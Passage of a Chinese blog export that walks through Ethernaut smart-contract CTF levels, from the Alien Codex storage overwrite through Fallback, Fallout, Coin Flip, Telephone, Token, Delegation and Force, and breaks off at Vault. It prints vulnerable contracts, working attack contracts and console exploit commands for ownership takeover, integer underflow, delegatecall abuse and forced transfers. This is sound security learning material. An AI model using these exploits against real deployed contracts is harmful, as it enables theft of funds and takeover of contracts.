<p>就会发现，实际上该合约的存储结构中，第一个<code>slot</code>的布局如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">|      unused(11)      |contact(1) |        owner (20)       | &lt;- slot 0</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>再次查看<code>revise</code>函数，支持写入<code>codex</code>的某个位置，我们还注意到<code>retract</code>函数，是直接将动态长度减去1，实际上<code>slodity</code>这里并没有对动态数组长度做<strong>溢出检查</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.retract()</span><br><span class="line">await web3.eth.getStorageAt(instance, &quot;1&quot;)</span><br><span class="line"># return &#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>slot 1 存储的是动态数组codex的长度，关于动态数组中元素的位置，参照<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官网文档-状态变量在储存中的布局】</a></p>
</blockquote>
<p>由于我们的<code>codex</code>变量目前是和<code>slot 1</code>相关联，而动态数组的元素存储位置会从 <code>keccak256(p)</code> 开始，<code>p</code>是<code>slot index</code>，本关卡是1，此外， 它的布局方式与静态大小的数组相同。一个元素接着一个元素。</p>
<p>我们借助remix，写个计算<code>keccak256</code>的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function keccak256Helper(uint p) public pure returns(bytes32 res) &#123;</span><br><span class="line">        res &#x3D; keccak256(abi.encodePacked(p));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keccak256(1)&#x3D;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>

<p>该地址即为<code>codex</code>中元素的起始地址</p>
<p>借助<code>python</code>，我们可以计算一个偏移地址，使得偏移后的地址指向0，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hex(<span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br><span class="line">             <span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span></span><br></pre></td></tr></table></figure>

<p>我们调用<code>revise</code>函数，并将偏移地址设置成上述地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.revise(<span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span>, <span class="string">'0x000000000000000000000000'</span> + player.substr(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>然后我们可以确认我们已经成功获得所有权：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>【Ethernaut闯关录】上篇</title>
    <url>/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意中遇到一个网站<a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">【Ethernaut】</a>，类似于<code>ctf</code>平台一样，该网站有大概30个关卡，每个关卡都会考察一些智能合约的内容，正好把学来的知识实践一下，毕竟纸上得来终觉浅，绝知此事要躬行。</p>
<p>本篇是第一部分，主要涉及构造函数、<code>tx.origin</code>使用注意事项、整数溢出、<code>delegatecall</code>、<code>selfdestruct</code>等知识。</p>
<a id="more"></a>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>metamask：我使用的是chrome浏览器，安装这个插件比较容易，微软的edge也可以，而且后者下载插件比较简单</li>
<li>以太坊测试网：Goerli和Sepolia都可以，测试代币可分别在<a href="https://goerli-faucet.pk910.de/" target="_blank" rel="noopener">【1】</a>和<a href="https://sepolia-faucet.pk910.de/" target="_blank" rel="noopener">【2】</a>处获取，虽然得到的不多，但是足够完成所有关卡了。</li>
<li>remix：solidity编译器，有桌面版和网页在线版，我是用的是网页版，这是<a href="https://remix.ethereum.org" target="_blank" rel="noopener">【链接】</a>。桌面版无法连接metamask，有些关卡需要我们部署一些合约，对于remix网页版比较方便。</li>
</ul>
<p>好，以上条件都准备好以后，我们就可以开启我们的闯关之旅了！</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>这一关卡主要是熟悉本游戏的操作运用，不过说实话，本关卡我认为并不是最简单的，没有些脑洞，根本没法通关。</p>
<p>因此在控制台输入以下函数即可通关：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.info()</span><br><span class="line"><span class="keyword">await</span> contract.info1()</span><br><span class="line"><span class="keyword">await</span> contract.info2(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.infoNum()</span><br><span class="line"><span class="keyword">await</span> contract.info42()</span><br><span class="line"><span class="keyword">await</span> contract.theMethodName()</span><br><span class="line"><span class="keyword">await</span> contract.method7123949()</span><br><span class="line"><span class="keyword">await</span> contract.password()</span><br><span class="line"><span class="keyword">await</span> contract.authenticate(<span class="string">'ethernaut0'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">  &#x2F;&#x2F; 要求发送过来的小于 0.001</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#x2F;&#x2F; 如果发起方的贡献大于合约拥有者的贡献，则归属权转换</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 只有合约拥有者才能发起退款</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 注意这里是利用点</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong></p>
<ol>
<li>获得合约所有权</li>
<li>将合约所有者的余额清零</li>
</ol>
<p>要想改变合约的owner可以通过两种方法实现：</p>
<ol>
<li>不断调用contribute()函数</li>
<li>合约接收没有数据的纯ether(例如：转账函数))</li>
</ol>
<p>第一个不现实，我们使用第二个。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;) &#x2F;&#x2F;首先使贡献值大于0</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;) &#x2F;&#x2F;触发fallback函数</span><br><span class="line">contract.withdraw() &#x2F;&#x2F;将合约的balance清零</span><br></pre></td></tr></table></figure>

<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line">&#x2F;&#x2F; 调用方份额增加</span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向allocator转账数量为 allocations[allocator]</span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向发起方转账所有的（合约的）余额</span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>虽然代码中没有任何关于获取所有权的代码，但是仔细一看，发现构造函数写错了，因此所有人都可以调用<code>Fal1out()</code>函数来获得权限。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.Fal1out(&#123;value: 1&#125;)</span><br></pre></td></tr></table></figure>

<p>然后submit</p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 要猜 side 的变量的值</span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>consecutiveWins</code>增加到10</p>
<p>题意是要我们“猜“上一个区块的哈希值转为<code>uint256</code>后，除以FACTOR后是不是1，要连续猜对10次，注意每次都要等新区快出现后才调用，否则会触发<code>lastHash == blockValue</code>。</p>
<p>看上去，很难猜得中，但是实际上区块的哈希我是<strong>可以获取到</strong>的！在控制台输入<code>help()</code>发现只有<code>getBlockNumber()</code>函数可以使用，无法使用<code>blockhash()</code>函数，看来不能仅使用控制台了。</p>
<p>实际上，我们可以使用一个辅助的合约，在合约中使用<code>blockhash</code>函数，部署和调用合约，我这里使用remix，然后将其连接到metamask中，连接过程可参考<a href="https://www.freesion.com/article/87861092736/#:~:text=%E4%BD%BF%E7%94%A8remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E5%8F%91%E5%B8%83%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%EF%BC%88%E4%BB%A3%E5%B8%81%EF%BC%89%E6%9C%80%E5%85%A8%E6%95%99%E7%A8%8B%201%20%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E8%AF%B7%E6%B3%A8%E6%84%8F%E5%A6%82%E6%9E%9C%E7%BC%96%E8%BE%91%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8EMetaMask%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8%20http,%E5%8D%8F%E8%AE%AE%E6%89%93%E5%BC%80%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%94%A8%20https%20%2C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%9C%89%E6%97%B6%E5%80%99%E4%BC%9A%E5%8F%91%E7%94%9F%E8%BF%99%E7%A7%8D%E4%BA%8B%E6%83%85%EF%BC%8C%E6%8D%A2%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E3%80%82%20https%E5%85%B6%E5%AE%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E5%8F%AA%E6%9C%89http%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%202%20%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%201.remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">【使用REMIX与METAMASK进行发布智能合约（代币）最全教程】</a></p>
<p>下面是攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlipAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    CoinFlip constant private target &#x3D; CoinFlip(0xbE079d11154090c4337c8958c33cD8D5Dc0409B1);</span><br><span class="line">    uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uint256 blockValue &#x3D; uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">        bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不断调用<code>attack()</code>函数，直至在控制台调用<code>await contract.consecutiveWins()</code>的返回值大于10，即可进行提交</p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>先看合约代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取合约的所有权。</p>
<p>代码很少啊，但是很清晰，里边使用了<code>tx.origin</code>，这个是返回最初发起交易的地址，比如说，A要发送一个交易给B，B将其转发到C，此时对于C来说，<code>tx.origin</code>就是<code>A</code>的地址。这么说有点不太正确，引用<a href="https://learnblockchain.cn/article/3568" target="_blank" rel="noopener">【登链社区】</a>的说法吧：</p>
<blockquote>
<p><strong>msg.sender:</strong> 指直接调用智能合约功能的帐户或智能合约的地址<br><strong>tx.origin:</strong> 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin</p>
</blockquote>
<p>那我们可以直接部署某个智能合约，在该合约中，调用<code>changeOwner</code>函数即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TelephoneAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    Telephone constant private target &#x3D; Telephone(0xAcCE018DCB481A326A05E16f6F33f13C63FcC50A);</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在控制台输入<code>await contract.owner()</code>后，如果返回的是我们的用户地址，则说明我们已经成功拿下合约的所有权。</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：增加你手中的 token 数量</p>
<p>想要增加我们的代币量，一种方法是合约所有者调用<code>transfer</code>函数给我们发送代币，但是实际上我们无法冒充合约所有者，因此这种方法并不现实。</p>
<p>实际上本关卡考察的是溢出，<code>uint</code>是<code>uint256</code>的别名，该类型数据只能表示$[0,2^{256}-1]$，该类型的数据达到所能表示的最大值后，如果再加1，就会变成0.</p>
<p>我们再来看如何绕过<code>require(balances[msg.sender] - _value &gt;= 0)</code>。</p>
<p>实际上我们只要调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.transfer(<span class="string">'0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae'</span>, <span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<p>即可，其中，<code>0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae</code>是一个和<code>player</code>不同的<strong>有效账户地址</strong>。</p>
<p>因为一开始我们的<code>player</code>的余额是20，其减去21，由于溢出，<code>balances[msg.sender] - _value</code>是一个256表示的最大值。</p>
<h2 id="Delatation"><a href="#Delatation" class="headerlink" title="Delatation"></a>Delatation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取<code>Delegation</code>合约的所有权。</p>
<p>考察的是<code>delegatecall</code>用法，引用<a href="https://learnblockchain.cn/docs/solidity/introduction-to-smart-contracts.html?highlight=delegatecall" target="_blank" rel="noopener">【官方文档】</a>对其的介绍：</p>
<blockquote>
<p>有一种特殊类型的消息调用，被称为 <strong>委托调用(\</strong>delegatecall*<em>)*</em> 。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 <code>msg.sender</code> 和 <code>msg.value</code> 不变。 这意味着一个合约可以在运行时从另外一个地址动态加载代码。存储、当前地址和余额都指向发起调用的合约，只有代码是从被调用地址获取的。 这使得 Solidity 可以实现”库“能力：可复用的代码库可以放在一个合约的存储上，如用来实现复杂的数据结构的库。</p>
</blockquote>
<p>实际上：</p>
<ul>
<li><code>call</code>：<code>msg</code>变量会修改为<strong>调用者</strong>，执行环境为<strong>被调用者</strong>的运行环境</li>
<li><code>delegatecall</code>：<code>msg</code>变量<strong>不变</strong>，执行环境为<strong>调用者</strong>的运行环境</li>
<li><code>callcode</code>：<code>msg</code>变量会修改为调用者，执行环境为<strong>调用者</strong>的运行环境</li>
</ul>
<p>看上去有点绕，举个例子，假如你调用（使用<code>call</code>的方式）一个合约A中的某个函数，这个函数又使用<code>delegatecall</code>的方式调用了合约B的函数，如果合约B中的函数发生了状态（<code>storage</code>）改变，<strong>则改变的是A中的状态</strong>，同时，在B看来，<strong>msg的值是和你相关的</strong>（即msg.sender是你的地址）</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130024.png" alt></p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>回归到本关卡，我们要想办法执行<code>fallback()</code>函数，然后想办法借助<code>delegatecall</code>函数执行<code>pwn</code>函数，如此一来，就能改变<code>Delegation</code>合约中的<code>owner</code>变量了，具体而言，是改成我们的地址。</p>
<p><code>delegatecall</code>用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address.delegatecall(二进制编码数据)</span><br></pre></td></tr></table></figure>

<p>二进制编码利用结构化编码函数 abi.encodeWithSignature 获得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;,逗号分隔的具体参数)</span><br></pre></td></tr></table></figure>

<p>例如<code>abi.encodeWithSignature(&quot;f1(uint256,address)&quot;,_x, _addr)</code></p>
<p>对于本关卡，我们可以借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function foo() pure public returns(bytes memory result)&#123;</span><br><span class="line">        result &#x3D; abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，调用<code>foo</code>函数可以得到返回值<code>0xdd365b8b</code>。</p>
<p>然后我们可以在控制台中输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">data</span>:<span class="string">'0xdd365b8b'</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>然后查询</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>

<p>如果是你的地址，则说明成功了。</p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将合约的余额提升至大于0.</p>
<p><img src="https://cdn.yalexin.top/v2-7e6e4f830bc320cded2e3972596be27a_r.jpg" alt></p>
<p>去网上看了看别人的做法，才知道是使用<code>selfdestruct</code>函数</p>
<blockquote>
<p><code>selfdestruct</code>由以太坊智能合约提供，用于销毁区块链上的合约系统。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。然而，自毁函数也是一把双刃剑，一方面它可以使开发人员能够从以太坊中删除智能合约并在紧急情况下转移以太币。另一方面自毁函数也可能成为攻击者的利用工具，攻击者可以利用该函数向目标合约“<strong>强制转账</strong>”，此时并不会触发目标合约的fallback函数，因此不需要该合约有任何的<code>payable</code>函数，从而影响目标合约的正常功能</p>
</blockquote>
<p>因此我们借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    function attack(address _addr) payable public &#123;</span><br><span class="line">        selfdestruct(payable(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">    fallback()payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，先往该攻击合约中转入少许以太币，然后再调用<code>attack</code>函数即可。</p>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked &#x3D; true;</span><br><span class="line">    password &#x3D; _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password &#x3D;&#x3D; _password) &#123;</span><br><span class="line">      locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将变量<code>locked</code>改为<code>false</code>.</p>
<p>看上去<code>password</code>是私有的，我们无法查看，但是这里有点“<strong>此地无银三百两</strong>”的味道在里边。</p>
<p>private 定义的函数和状态变量只对定义它的合约可见，该合约派生的合约都不能调用和访问该函数及状态变量。</p>
<p>在合约之外，我们仍然可以获取该变量的值，因为智能合约最终都会写进链上，包括<code>storage</code>，而变量属于<code>storage</code>。</p>
